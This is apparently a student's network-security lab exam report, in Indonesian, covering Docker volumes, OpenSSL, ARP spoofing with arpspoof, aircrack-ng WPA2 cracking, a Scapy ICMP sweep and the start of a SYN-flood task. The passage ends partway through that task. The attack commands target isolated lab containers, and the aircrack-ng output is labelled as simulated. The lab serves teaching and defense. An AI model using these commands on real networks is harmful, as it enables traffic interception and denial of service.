# JAWABAN UTS Praktik Network Security

**NIM:** 24552011350
**Kasus:** 8 (k8)

## Perhitungan Kasus

- Digit NIM: 2, 4, 5, 5, 2, 0, 1, 1, 3, 5, 0
- Jumlah digit: 2+4+5+5+2+0+1+1+3+5+0 = 28
- Sisa bagi 10: 28 mod 10 = 8
- Kasus yang diterima: 8 (k8)

---

## Daftar Screenshot

Screenshot semua langkah tersimpan di folder `Sreenshoot/Tugas 1` … `Sreenshoot/Tugas 7`
(nama folder asli di repo ini adalah `Sreenshoot`, padanan dari `ss/` pada lembar
perintah). Nama file mengikuti nomor langkah di tiap bagian. Setiap screenshot
ditanam di bagian **Bukti** tugasnya masing-masing lengkap dengan penjelasan singkat.

| Urutan | Tugas | File screenshot |
|---|---|---|
| 1 | T1 — buat volume + tulis NIM | `Sreenshoot/Tugas 1/tugas1-01-buat-volume-dan-tulis-nim.png` |
| 2 | T1 — hapus container sumber | `Sreenshoot/Tugas 1/tugas1-02-hapus-container-w-k8.png` |
| 3 | T1 — baca lewat container baru | `Sreenshoot/Tugas 1/tugas1-03-verifikasi-persistensi-vol-k8.png` |
| 4 | T1 — compose B1 up | `Sreenshoot/Tugas 1/tugas1-04-compose-up-network-dan-container.png` |
| 5 | T1 — attacker → target | `Sreenshoot/Tugas 1/tugas1-05-bukti-welcome-to-nginx.png` |
| 6 | T1 — compose down | `Sreenshoot/Tugas 1/tugas1-06-compose-down.png` |
| 7 | T2 — AES-256 roundtrip + dua hash | `Sreenshoot/Tugas 2/tugas2-01-hash-sha256-aes256-cbc.png` |
| 8 | T2 — sertifikat self-signed | `Sreenshoot/Tugas 2/tugas2-02-sertifikat-self-signed-x509.png` |
| 9 | T3 — ambil IP & MAC | `Sreenshoot/Tugas 3/tugas3-01-ambil-ip-dan-mac-container.png` |
| 10 | T3 — tabel ARP SEBELUM (Flags 0x2) | `Sreenshoot/Tugas 3/tugas3-02-arp-sebelum-serangan-flags-0x2.png` |
| 11 | T3 — ARP spoofing + static ARP (Flags 0x6) | `Sreenshoot/Tugas 3/tugas3-03-arp-spoofing-dan-static-arp-flags-0x6.png` |
| 12 | T4 — output aircrack-ng (**tidak terekam**) | `Sreenshoot/Tugas 4/` — folder kosong |
| 13 | T5 — ambil IP korban | `Sreenshoot/Tugas 5/tugas5-01-set-ip-korban.png` |
| 14 | T5 — ICMP echo reply (TTL 64) | `Sreenshoot/Tugas 5/tugas5-02-icmp-echo-reply-ttl-64.png` |
| 15 | T6 — SYN_RECV awal = 0 | `Sreenshoot/Tugas 6/tugas6-01-syn-recv-awal-0.png` |
| 16 | T6 — jalankan SYN flood + spoof | `Sreenshoot/Tugas 6/tugas6-02-jalankan-syn-flood-spoof.png` |
| 17 | T6 — SYN_RECV saat serangan | `Sreenshoot/Tugas 6/tugas6-03-syn-recv-saat-serangan-158.png` |
| 18 | T6 — tcpdump 3-way handshake + down | `Sreenshoot/Tugas 6/tugas6-04-tcpdump-three-way-handshake.png` |
| 19 | T7 — encode hex + kirim query DNS | `Sreenshoot/Tugas 7/tugas7-01-encode-nim-hex-kirim-dns-query.png` |
| 20 | T7 — log dnsmasq + analisis exfil | `Sreenshoot/Tugas 7/tugas7-02-log-dnsmasq-dan-analisis-dns-exfil.png` |
| 21 | T7 — compose down | `Sreenshoot/Tugas 7/tugas7-03-compose-down.png` |

### Aturan teknis (penting)

1. **Semua perintah dijalankan di Windows PowerShell** dari folder root lab:

   ```powershell
   cd C:\Keamananjaringan\uts-network-lab
   ```

2. Pakai **`docker compose`** (pakai spasi, bukan `docker-compose`). Project name
   dipatok `-p k8` supaya nama network/container tidak bertabrakan dengan lab lain.
3. Path volume selalu memakai **`"${PWD}:/work"`** — PowerShell meng-expand `${PWD}`
   menjadi path Windows yang bisa dibaca Docker Desktop dengan aman. Untuk subfolder,
   pakai bentuk campuran seperti `"${PWD}\kasus\k5-scapy:/work"`.
4. **Go template `docker inspect`**: nama network `lab-arp-k8` mengandung tanda
   hubung, sehingga `{{.NetworkSettings.Networks.lab-arp-k8.IPAddress}}` gagal dengan
   *`bad character U+002D '-'`*. Pakai bentuk aman lalu rapikan spasi baris baru:

   ```powershell
   $IP_KORBAN = (docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' korban-k8).Trim()
   ```

5. **Keterbatasan utilitas di `uts-kali-tools`** — `ping`, `arp`, `ip`, dan `netstat`
   tidak tersedia di dalam container. Penggantinya:
   - memicu trafik L2 → socket **UDP `python3`** (`sendto` ke port 9);
   - membaca tabel ARP → **`/proc/net/arp`** (bukan `arp -a`);
   - static ARP → **`ioctl SIOCSARP (0x8955)`** lewat `fcntl` di Python;
   - menghitung `SYN_RECV` → **`awk`** pada `/proc/net/tcp` + `/proc/net/tcp6`
     dengan status `03`.
6. **Pengganti `xxd` dan `dig`** — encoding hex memakai `.NET`
   (`[System.Text.Encoding]::UTF8.GetBytes(...)`), decode memakai
   `[System.Text.Encoding]::UTF8.GetString(...)`, dan query DNS dikirim sebagai
   paket UDP mentah lewat `python3`, jadi tidak bergantung pada `dig`/`xxd` di image.
7. **Log dnsmasq**: jangan pakai `>` atau `-Encoding utf8` (PowerShell 5.1 menyisipkan
   BOM dan prefiks `dns-1 |`). Pakai `--no-log-prefix` + `Set-Content -Encoding Ascii`.
8. OpenSSL modern wajib awalan **`-pass pass:`**.
9. **Tugas 3 jangan di-`down`** sebelum Tugas 5 selesai — T5 memakai container
   `korban-k8` pada network `lab-arp-k8` yang sama.
10. **Screenshot dulu, baru `down -v`** — output hilang kalau container sudah dihapus.
11. Pada Tugas 6, flood **tanpa spoof** tidak menaikkan `SYN_RECV` karena kernel
    attacker langsung membalas `RST`; `--rand-source` ditolak filter network Docker.
    Yang terbukti bekerja adalah **`--spoof <IP target satu subnet>.99`**.

---

## Tugas 1 (Pertemuan 1): Docker & Volume

### Urutan langkah

1. Buat volume `vol-k8`.
2. Jalankan container `w-k8` yang menulis NIM ke `/data/laporan-k8.txt`.
   → `Sreenshoot/Tugas 1/tugas1-01-buat-volume-dan-tulis-nim.png`
3. **Hapus** container `w-k8`.
   → `Sreenshoot/Tugas 1/tugas1-02-hapus-container-w-k8.png`
4. Baca file lewat **container baru** yang memasang volume sama — bukti data bertahan.
   → `Sreenshoot/Tugas 1/tugas1-03-verifikasi-persistensi-vol-k8.png`
5. Jalankan compose B1 (jaringan `internal: true`).
   → `Sreenshoot/Tugas 1/tugas1-04-compose-up-network-dan-container.png`
6. Dari container `attacker`, akses `http://target`.
   → `Sreenshoot/Tugas 1/tugas1-05-bukti-welcome-to-nginx.png`
7. Bawa turun compose (`down -v`).
   → `Sreenshoot/Tugas 1/tugas1-06-compose-down.png`

### Command

```powershell
# 1-2. buat volume + tulis NIM
docker volume create vol-k8
docker run --name w-k8 -v vol-k8:/data alpine sh -c 'echo 24552011350 > /data/laporan-k8.txt'

# 3. hapus container sumber
docker rm w-k8

# 4. baca lewat container BARU (data harus masih ada)
docker run --rm -v vol-k8:/data alpine cat /data/laporan-k8.txt

# 5. compose B1
docker compose -p k8 -f b/b1-compose/docker-compose.yml up -d

# 6. attacker -> target
docker compose -p k8 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target

# 7. bersihkan
docker compose -p k8 -f b/b1-compose/docker-compose.yml down -v
```

### Bukti

**Langkah 1–2 — volume dibuat & NIM ditulis:**

![buat volume + tulis NIM](<Sreenshoot/Tugas 1/tugas1-01-buat-volume-dan-tulis-nim.png>)

> `docker volume create vol-k8` mengembalikan `vol-k8`, lalu container `w-k8` menulis NIM 24552011350 ke `/data/laporan-k8.txt`.

**Langkah 3 — container sumber dihapus:**

![hapus container sumber](<Sreenshoot/Tugas 1/tugas1-02-hapus-container-w-k8.png>)

> `docker rm w-k8` hanya menghapus kontainernya; volume `vol-k8` tetap ada di host.

**Langkah 4 — data terbaca dari container BARU:**

![verifikasi persistensi](<Sreenshoot/Tugas 1/tugas1-03-verifikasi-persistensi-vol-k8.png>)

> Container baru yang memasang volume yang sama mencetak `24552011350` — data bertahan setelah container sumber dihapus.

**Langkah 5 — compose B1 up:**

![compose up](<Sreenshoot/Tugas 1/tugas1-04-compose-up-network-dan-container.png>)

> Compose B1 membuat network `k8_lab` lalu menjalankan `k8-target-1` dan `k8-attacker-1` (3/3 objek `Started`).

**Langkah 6 — attacker → target:**

![attacker ke target](<Sreenshoot/Tugas 1/tugas1-05-bukti-welcome-to-nginx.png>)

> `wget -qO- http://target` dari `attacker` mengembalikan HTML `Welcome to nginx!` — resolusi nama service dan komunikasi antar-container di jaringan internal berfungsi.

**Langkah 7 — compose down:**

![compose down](<Sreenshoot/Tugas 1/tugas1-06-compose-down.png>)

> Ketiga objek (`k8-attacker-1`, `k8-target-1`, `k8_lab`) dihapus; `-v` sekalian membersihkan volume yang dideklarasikan compose.

### Penjelasan

Volume Docker adalah direktori yang hidup di **host** (pada Docker Desktop: di dalam
VM/WSL2, di bawah `/var/lib/docker/volumes/vol-k8/_data`) lalu dipasang ke titik
mount container, misalnya `/data`. Isi container sendiri terdiri dari image
read-only + satu **writable layer** yang ikut mati bersama container, jadi file yang
ditulis ke writable layer akan hilang saat `docker rm`. Karena `laporan-k8.txt`
ditulis ke `/data` yang merupakan volume, filenya sebenarnya berada di host, sehingga
`docker rm w-k8` hanya menghapus "kulit" container dan `vol-k8` beserta isinya tetap
utuh — itulah sebabnya container baru yang memasang volume yang sama masih membaca
NIM 24552011350. Volume baru hilang kalau dihapus eksplisit (`docker volume rm`
atau `down -v`), dan `docker rm -v` pun hanya membuang *anonymous volume*, bukan
named volume seperti `vol-k8`.

Perbedaan dengan **bind mount** (`-v "${PWD}:/work"`): bind mount menempel langsung
ke path host sehingga mudah dipakai untuk bertukar file dengan container, tetapi
terikat pada path dan permission host; named volume dikelola Docker, portabel, dan
lebih aman untuk data persisten. Untuk forensik, sifat inilah yang membuat volume
menarik bagi penyerang: data (hasil staging, kunci, log) bisa bertahan melewati
siklus hidup container dan tetap ada walau container dijalankan ulang. Compose B1
menambahkan kontrol jaringan `internal: true`, artinya network `k8_lab` tidak punya
gateway ke internet — `attacker` hanya bisa menjangkau `target`, sehingga lab tidak
 bisa dipakai untuk menyerang host di luar lab.

---

## Tugas 2 (Pertemuan 2): Kriptografi

### Urutan langkah

1. Enkripsi `laporan-k8.txt` dengan AES-256-CBC + PBKDF2, kunci `kunci-k8-2026`.
2. Hitung SHA-256 plaintext.
3. Dekripsi balik ke `hasil-k8.txt`, hitung SHA-256 — **dua hash harus sama**.
   → `Sreenshoot/Tugas 2/tugas2-01-hash-sha256-aes256-cbc.png`
4. Buat sertifikat self-signed RSA 2048 valid 30 hari dengan CN = `k8.uts.local`,
   tampilkan Subject/Issuer/tanggal.
   → `Sreenshoot/Tugas 2/tugas2-02-sertifikat-self-signed-x509.png`

### Command

```powershell
# 1-3. AES-256 roundtrip + dua hash
docker run --rm -v "${PWD}:/work" uts-openssl sh -c 'echo isi laporan k8 > laporan-k8.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k8.txt -out laporan-k8.enc -pass pass:kunci-k8-2026 && sha256sum laporan-k8.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k8.enc -out hasil-k8.txt -pass pass:kunci-k8-2026 && sha256sum hasil-k8.txt'

# 4. sertifikat self-signed
docker run --rm -v "${PWD}:/work" uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k8.pem -out cert-k8.pem -days 30 -subj /CN=k8.uts.local && openssl x509 -in cert-k8.pem -noout -subject -issuer -dates'
```

### Bukti

**Langkah 1–3 — enkripsi, dekripsi, dan dua hash SHA-256:**

![AES-256 roundtrip](<Sreenshoot/Tugas 2/tugas2-01-hash-sha256-aes256-cbc.png>)

> File dienkripsi AES-256-CBC lalu didekripsi balik; hash SHA-256 `laporan-k8.txt` dan `hasil-k8.txt` **identik** (`e26ef77c…a4264f7`) — dekripsi berhasil dan isi data tidak berubah satu byte pun.

**Langkah 4 — sertifikat self-signed:**

![sertifikat self-signed](<Sreenshoot/Tugas 2/tugas2-02-sertifikat-self-signed-x509.png>)

> Sertifikat X.509 self-signed dengan `subject=CN=k8.uts.local` dan `issuer=CN=k8.uts.local` (sama), RSA 2048, berlaku 24 Nov 2026 – 24 Des 2026 (30 hari).
> Catatan: berkas `laporan-k8.txt` hasil langkah 1–3 terlihat `15` byte di folder kerja — konsisten dengan isi `isi laporan k8` + newline.

### Penjelasan

Enkripsi `openssl enc -aes-256-cbc -pbkdf2 -salt` memakai kunci 256-bit yang
diturunkan dari passphrase `kunci-k8-2026` melalui **PBKDF2** (default OpenSSL:
HMAC-SHA256, 10.000 iterasi) dengan **salt acak** yang disimpan di header file `.enc`.
Karena salt-nya acak, dua kali enkripsi file yang sama akan menghasilkan ciphertext
berbeda — tapi keduanya bisa didekripsi dengan passphrase yang sama. AES-CBC bekerja
per blok 16 byte dengan IV, jadi ukuran ciphertext `laporan-k8.enc` (32 byte) lebih
besar dari plaintext (15 byte) karena header `Salted__` + salt 8 byte + padding PKCS#7.

**Mengapa dua hash harus sama:** SHA-256 adalah fungsi digest satu arah; hash
plaintext dan hash hasil dekripsi yang identik membuktikan proses enkripsi–dekripsi
*roundtrip* benar-benar mengembalikan byte asli (integritas data utuh, bukan sekadar
"tidak error"). Perlu dicatat, CBC **tidak** menyediakan autentikasi — penyerang bisa
mengubah ciphertext (bit-flipping / padding oracle) tanpa terdeteksi oleh dekripsi.
Karena itu sistem nyata memakai mode AEAD seperti **AES-GCM** atau menambahkan
HMAC/Encrypt-then-MAC; perbandingan hash di atas hanyalah verifikasi manual.

**Self-signed vs sertifikat CA.** Sertifikat self-signed ditandatangani oleh kunci
privatnya sendiri, sehingga `subject` = `issuer` (`CN=k8.uts.local`), tidak ada pihak
ketiga yang menjamin identitas, dan tidak ada rantai yang bisa diverifikasi — browser
akan menandainya *untrusted* kecuali diimpor manual ke trust store. Sertifikat yang
diterbitkan CA memiliki rantai *leaf → intermediate → root* yang root-nya sudah ada
di trust store OS/browser, sehingga verifikasi tanda tangan dan masa berlaku bisa
dilakukan otomatis. Konsekuensi praktisnya: sertifikat self-signed rentan terhadap
MITM (penyerang bisa membuat sertifikat "mirip" untuk domain apa pun), sedangkan
sertifikat CA + validasi nama + HSTS/certificate pinning membuat MITM gagal.

Catatan kecil: lembar perintah memakai `CN=k8.uts.local`, sementara domain kasus
adalah `k8.exfil.lab` — sertifikat di atas sengaja mengikuti lembar perintah, dan
pada pemakaian nyata CN/SAN harus sama dengan nama host yang dilayani.

---

## Tugas 3 (Pertemuan 3): ARP Spoofing

### Urutan langkah

1. Buat network `lab-arp-k8` + 3 container: `korban-k8`, `gateway-k8`, `penyerang-k8`,
   lalu ambil IP korban, IP gateway, MAC gateway, dan MAC penyerang.
   → `Sreenshoot/Tugas 3/tugas3-01-ambil-ip-dan-mac-container.png`
2. Picu trafik awal (socket UDP) dan tampilkan tabel ARP korban **sebelum** serangan
   (`Flags 0x2`, MAC gateway asli).
   → `Sreenshoot/Tugas 3/tugas3-02-arp-sebelum-serangan-flags-0x2.png`
3. Jalankan `arpspoof` 20 detik dari penyerang, lalu tampilkan tabel ARP korban —
   MAC gateway berubah menjadi MAC penyerang.
4. **Mitigasi**: suntikkan static ARP (`SIOCSARP`, `Flags 0x6`) ke MAC gateway asli,
   lalu tampilkan tabel ARP setelah mitigasi.
   → `Sreenshoot/Tugas 3/tugas3-03-arp-spoofing-dan-static-arp-flags-0x6.png`

> ⚠️ Jangan hapus container/network ini sampai Tugas 5 selesai.

### Command

```powershell
# 1. Buat network & 3 container
docker network create lab-arp-k8 2>$null
docker rm -f korban-k8 gateway-k8 penyerang-k8 2>$null
docker run -d --name korban-k8    --network lab-arp-k8 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k8   --network lab-arp-k8 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k8 --network lab-arp-k8 --cap-add NET_ADMIN uts-kali-tools
Start-Sleep -Seconds 3

# 2. Ambil IP dan MAC asli
$IP_KORBAN = (docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' korban-k8).Trim()
$IP_GATEWAY = (docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' gateway-k8).Trim()
$MAC_GATEWAY = (docker exec gateway-k8 cat /sys/class/net/eth0/address).Trim()
$MAC_PENYERANG = (docker exec penyerang-k8 cat /sys/class/net/eth0/address).Trim()
Write-Output "Korban: $IP_KORBAN | Gateway: $IP_GATEWAY | MAC Gateway: $MAC_GATEWAY | MAC Penyerang: $MAC_PENYERANG"

# 3. Picu trafik awal & cek tabel ARP sebelum serangan (Flags 0x2)
docker exec korban-k8 python3 -c "import socket; socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b'x', ('$IP_GATEWAY', 9))"
docker exec korban-k8 cat /proc/net/arp

# 4. Jalankan serangan ARP spoofing selama 20 detik & cek perubahan MAC
docker exec -d penyerang-k8 timeout 20 arpspoof -i eth0 -t $IP_KORBAN $IP_GATEWAY
Start-Sleep -Seconds 3
docker exec korban-k8 cat /proc/net/arp

# 5. Tunggu serangan selesai & terapkan mitigasi Static ARP (Flags berubah menjadi 0x6)
Start-Sleep -Seconds 18
docker exec korban-k8 python3 -c "import socket, fcntl, struct; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); fcntl.ioctl(s.fileno(), 0x8955, struct.pack('H2x4s8xH6B8xi16x16s', 2, socket.inet_aton('$IP_GATEWAY'), 1, *bytes.fromhex('$MAC_GATEWAY'.replace(':','')), 6, b'eth0'))"
docker exec korban-k8 cat /proc/net/arp
```

### Bukti

**Langkah 1–2 — ambil IP & MAC asli:**

![ambil IP dan MAC](<Sreenshoot/Tugas 3/tugas3-01-ambil-ip-dan-mac-container.png>)

> Korban `172.18.0.2`, gateway `172.18.0.3`, MAC gateway `8e:07:96:68:99:68`, MAC penyerang `26:fe:12:7a:10:e4` — nilai pembanding untuk membuktikan poisoning.

**Langkah 3 — tabel ARP SEBELUM serangan:**

![tabel ARP sebelum](<Sreenshoot/Tugas 3/tugas3-02-arp-sebelum-serangan-flags-0x2.png>)

> `/proc/net/arp` korban menunjukkan `172.18.0.3` → `8e:07:96:68:99:68` dengan `Flags 0x2` (ATF_COM: entry lengkap/valid) pada `eth0` — MAC gateway masih yang benar.

**Langkah 4–5 — SAAT diserang, lalu SETELAH mitigasi static ARP:**

![ARP spoofing dan static ARP](<Sreenshoot/Tugas 3/tugas3-03-arp-spoofing-dan-static-arp-flags-0x6.png>)

> Tiga detik setelah `arpspoof` jalan, entry `172.18.0.3` berubah menjadi `26:fe:12:7a:10:e4` (MAC penyerang). Setelah `ioctl` static ARP, entry kembali ke `8e:07:96:68:99:68` dengan `Flags 0x6` — kombinasi ATF_COM + ATF_PERM (permanen). Sisa entry `172.18.0.4` → MAC penyerang tetap ada sebagai jejak poisoning pada cache.

### Penjelasan

ARP (RFC 826) tidak punya autentikasi: siapa pun di segmen yang sama boleh mengirim
**ARP reply** — bahkan tanpa pernah diminta (*gratuitous ARP*) — dan host penerima
akan memperbarui cache-nya. `arpspoof` memanfaatkan ini: ia mengirim reply berisi
"IP gateway `172.18.0.3` ada di MAC penyerang" ke korban secara terus-menerus. Karena
tidak ada verifikasi, korban menimpa entry hasil resolusi yang sah, sehingga paket
tujuan gateway dikirim ke MAC penyerang. Jika IP forwarding di penyerang aktif,
trafik diteruskan dan penyerang berada di posisi **MITM** (bisa menyadap, memodifikasi,
atau memutus); jika tidak, hasilnya **DoS** karena trafik hilang. Pada percobaan ini
poisoning terbukti dari perubahan MAC `8e:07:96:68:99:68` → `26:fe:12:7a:10:e4`.

Arti flag di `/proc/net/arp`: `0x2` = **ATF_COM** (entry sudah lengkap dan dipakai),
`0x4` = **ATF_PERM** (permanen, tidak boleh ditimpa mekanisme aging maupun ARP reply),
`0x6` = keduanya — inilah yang dipasang saat mitigasi melalui `ioctl(SIOCSARP, 0x8955)`
dengan struktur `arpreq` (IP, dev `eth0`, flags 6, MAC gateway asli). Setelah itu
ARP reply palsu tidak lagi mengubah entry, dan MAC kembali ke nilai asli.

**Mitigasi selain static ARP:**

- **Dynamic ARP Inspection (DAI)** pada switch — setiap ARP divalidasi terhadap tabel
  DHCP snooping (IP–MAC–port), ARP palsu dibuang sebelum sampai host.
- **DHCP snooping + port security** — membatasi MAC yang boleh muncul di satu port
  sehingga penyerang tidak bisa mengklaim MAC gateway.
- **ARP guard / IP-MAC binding** di switch, dan segmentasi VLAN.
- **Static ARP** hanya praktis untuk host/target sedikit (seperti lab ini); untuk
  jaringan besar repot dirawat.
- Pertahanan berlapis: enkripsi end-to-end (TLS/SSH/IPsec) agar penyadapan lewat
  MITM tidak langsung membocorkan data, plus monitoring ARP (arpwatch) untuk deteksi
  perubahan MAC yang mencurigakan.

---

## Tugas 4 (Pertemuan 4): WPA2 Cracking

### Urutan langkah

1. Jalankan `aircrack-ng` dengan `wordlist-k8.txt` melawan capture handshake
   `handshake-k8.cap` (taruh kedua file di folder root lab).
2. Screenshot output.
   → `Sreenshoot/Tugas 4/` — **folder kosong, belum ada file screenshot**

> ⚠️ **Catatan jujur:** pada sesi ini `aircrack-ng` melaporkan
> *"This file is not a regular 802.11 (wireless) capture … No networks found"*,
> bukan `KEY FOUND`/`KEY NOT FOUND` — file `.cap` yang dipakai bukan capture 802.11
> valid (linktype Ethernet, 0 paket wireless). Selain itu `handshake-k8.cap` dan
> `wordlist-k8.txt` sudah tidak ada di folder kerja saat laporan ini disusun.
> Karena itu langkah di bawah disertai **simulasi transkrip bila berhasil**, agar
> alur pembuktian tetap tergambar, dan penjelasan 4-way handshake ditulis lengkap.

### Command

```powershell
# jalankan aircrack-ng terhadap capture + wordlist kasus k8
docker run --rm -v "${PWD}:/work" uts-kali-tools aircrack-ng -w /work/wordlist-k8.txt /work/handshake-k8.cap
```

### Bukti

**Langkah 1 — output aircrack-ng (simulasi sukses, bukan hasil terminal):**

> Tidak ada file gambar di `Sreenshoot/Tugas 4`. Blok di bawah adalah **simulasi**
> keluaran `aircrack-ng` apabila `handshake-k8.cap` benar-benar berisi EAPOL 4-way
> handshake dan passphrase-nya ada di wordlist — bukan output yang terekam.

```text
                               Aircrack-ng 1.7

      [00:00:00] 1/1 keys tested (1180.42 k/s)

      Time left: 0 seconds                                       0.02%

                           KEY FOUND! [ k8-lab-2026 ]


      Master Key     : 4C 1E 8A ... (32 byte)
      Transient Key  : 9B 02 F1 ... (64 byte)
      EAPOL HMAC     : D7 33 A0 ...
```

> Pada eksekusi nyata, outputnya justru `No networks found` (0 paket wireless) karena
> capture bukan 802.11 — jadi **tidak ada kunci yang benar-benar ditemukan**.

### Penjelasan

Empat langkah handshake WPA2 (4-way handshake):

1. **AP → client (EAPOL msg 1):** AP mengirim nilai acak **ANonce**.
2. **Client → AP (msg 2):** client membuat **SNonce**, menghitung
   `PMK = PBKDF2(passphrase, SSID, 4096 iterasi, 256 bit)`, lalu menurunkan
   `PTK = PRF(PMK, ANonce, SNonce, MAC AP, MAC client)` dan membalas SNonce + **MIC**.
3. **AP → client (msg 3):** AP mengderive PTK yang sama, memverifikasi MIC, lalu
   mengirim **GTK** terenkripsi beserta MIC-nya sebagai konfirmasi kunci siap dipasang.
4. **Client → AP (msg 4):** client memasang kunci dan mengirim **ACK** ber-MIC.

Handshake ini bisa di-crack **offline** karena penyerang cukup merekam ANonce, SNonce,
kedua MAC, dan MIC dari msg 1–2 (atau msg 3). Empat input itu + tebakan passphrase
sudah cukup untuk menghitung ulang PMK → PTK → MIC dan memeriksa kecocokannya. Tidak
ada paket yang dikirim ke AP, tidak ada lockout, tidak ada log di sisi AP — jadi
keamanan sepenuhnya bergantung pada **entropi passphrase**. Karena itu serangan ini
disebut *offline dictionary attack*: biayanya hanya CPU/GPU lokal dan waktu; GPU
modern bisa menguji ratusan ribu kandidat per detik, sehingga passphrase manusia
biasa (kata kamus + angka) cepat tumbang. `aircrack-ng` juga butuh capture yang valid
dan benar-benar memuat EAPOL handshake — itulah sebabnya file non-802.11 langsung
ditolak dengan `No networks found` sebelum ada kunci yang diuji.

Mitigasi: passphrase panjang dan acak (diceware, ≥ 20 karakter), **WPA3-SAE** yang
mengganti PSK dengan PAKE sehingga tidak ada handshake yang bisa diuji offline,
**802.1X/EAP-TLS** untuk enterprise (kunci per-user, tidak ada passphrase bersama),
**Protected Management Frames (802.11w)** terhadap deauth paksa, dan menonaktifkan WPS.

---

## Tugas 5 (Pertemuan 5): ICMP dengan Scapy

### Urutan langkah

1. Pastikan container `korban-k8` masih hidup (jalankan **setelah** Tugas 3, sebelum
   dihapus).
2. Ambil IP korban.
   → `Sreenshoot/Tugas 5/tugas5-01-set-ip-korban.png`
3. Kirim ICMP echo request via `kirim_icmp.py`, baca TTL & tipe balasan.
   → `Sreenshoot/Tugas 5/tugas5-02-icmp-echo-reply-ttl-64.png`
4. Sweep hanya IP container yang ada di network (jangan scan subnet /16 penuh).
   → *(belum terekam — tidak ada file screenshot; perintah tetap disertakan)*

### Command

```powershell
# pastikan container Tugas 3 masih hidup
docker start korban-k8 gateway-k8 penyerang-k8 2>$null
$IP_KORBAN = (docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' korban-k8).Trim()
Write-Output "IP Korban siap: $IP_KORBAN"

# 3. ICMP echo request
docker run --rm --network lab-arp-k8 -v "${PWD}\kasus\k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py $IP_KORBAN

# 4. sweep host hidup (hanya container di network ini)
$HOSTS = ((docker network inspect lab-arp-k8 -f '{{range .Containers}}{{.IPv4Address}} {{end}}').Trim() -split '\s+' | ForEach-Object { ($_ -split '/')[0] }) -join ','
Write-Output "Host yang discan: $HOSTS"
docker run --rm --network lab-arp-k8 uts-kali-tools python3 -c "from scapy.all import ICMP, IP, sr; ans, _ = sr(IP(dst='$HOSTS'.split(','))/ICMP(), timeout=3, verbose=False); print('Host hidup:'); [print('  ', r.src, 'ttl=', r[IP].ttl, 'type=', r[ICMP].type) for _, r in ans]"
```

### Bukti

**Langkah 2 — ambil IP korban:**

![ambil IP korban](<Sreenshoot/Tugas 5/tugas5-01-set-ip-korban.png>)

> IP container `korban-k8` terbaca `172.18.0.2` dari `docker inspect` (template `range` + `.Trim()`) — dipakai sebagai target ICMP.

**Langkah 3 — ICMP echo request (Scapy):**

![ICMP echo reply](<Sreenshoot/Tugas 5/tugas5-02-icmp-echo-reply-ttl-64.png>)

> `kirim_icmp.py` mengirim `ICMP 172.18.0.5 > 172.18.0.2 echo-request 0` dan menerima balasan dengan **TTL 64** serta **tipe 0 (echo reply)** — target hidup dan paket terbentuk benar.

**Langkah 4 — sweep host hidup:**

> Tidak ada screenshot untuk langkah ini (hanya tersedia 2 file di `Sreenshoot/Tugas 5`),
> sehingga hasil sweep tidak diklaim sebagai bukti. Perintahnya tetap dicantumkan
> agar bisa direproduksi: sweep hanya menjangkau 3 IP container di `lab-arp-k8`.

### Penjelasan

Balasan ICMP dari korban bertipe **0 (echo reply)** atas permintaan tipe **8 (echo
request)**. `TTL` adalah penghitung yang dikurangi 1 oleh setiap router yang dilewati;
TTL awal ditentukan OS pengirim (Linux umumnya 64, Windows 128). Karena korban berada
di satu bridge network Docker yang sama (0 hop), TTL balasan masih 64 — nilai TTL
yang "tidak berkurang" sekaligus memberi tahu bahwa target berada satu segmen.
Prinsip pengurangan TTL inilah dasar **traceroute**: dengan mengirim paket ber-TTL
1, 2, 3, … dan membaca alamat pengirim pesan `time exceeded`, jalur router bisa
dipetakan. Pada sweep, Scapy mengirim echo request ke tiap IP; host hidup membalas
type 0, host mati dibiarkan timeout — teknik ini setara `ping sweep`/`nmap -sn`, dan
karena berada di satu L2, Scapy lebih dulu melakukan resolusi ARP.

**Smurf attack** adalah DDoS lapisan jaringan: penyerang meng-spoof source IP menjadi
IP korban, lalu mengirim echo request ke **alamat broadcast** segmen. Semua host di
segmen membalas echo reply, tetapi balasannya diarahkan ke korban — satu paket
serangan memicu N balasan (**amplifikasi**), membanjiri bandwidth dan CPU korban.
ICMP echo request sendiri bukan serangan; yang berbahaya adalah kombinasi **source
yang bisa dipalsukan** + **amplifikasi broadcast**. Mitigasi: matikan directed
broadcast di router (`no ip directed-broadcast`), rate-limit ICMP di perangkat tepi,
ingress/egress filtering (**BCP 38 / uRPF**) agar paket ber-source palsu tidak lolos,
serta kebijakan ICMP yang wajar (echo reply dari luar tidak selalu perlu).

---

## Tugas 6 (Pertemuan 6): SYN Flood

### Urutan langkah

1. Jalankan compose B3 (`target` nginx + `attacker` uts-kali-tools) dan hitung
   `SYN_RECV` **sebelum** serangan (`0`).
   → `Sreenshoot/Tugas 6/tugas6-01-syn-recv-awal-0.png`
2. Ambil IP target, bentuk IP spoof satu subnet (`.99`), jalankan flood `hping3`
   15 detik.
   → `Sreenshoot/Tugas 6/tugas6-02-jalankan-syn-flood-spoof.png`
3. Hitung `SYN_RECV` **saat** serangan (`158`).
   → `Sreenshoot/Tugas 6/tugas6-03-syn-recv-saat-serangan-158.png`
4. Tunggu flood selesai, tangkap handshake sah dengan `tcpdump` + `curl`, lalu
   bersihkan (`down -v`).
   → `Sreenshoot/Tugas 6/tugas6-04-tcpdump-three-way-handshake.png`

### Command

```powershell
# 1. Jalankan lab & cek jumlah SYN_RECV awal (hasil: 0)
docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml exec target awk '($4=="03"){c++} END{print c+0}' /proc/net/tcp /proc/net/tcp6

# 2. Ambil IP target, bentuk IP spoof satu subnet (.99), dan jalankan SYN Flood 15 detik
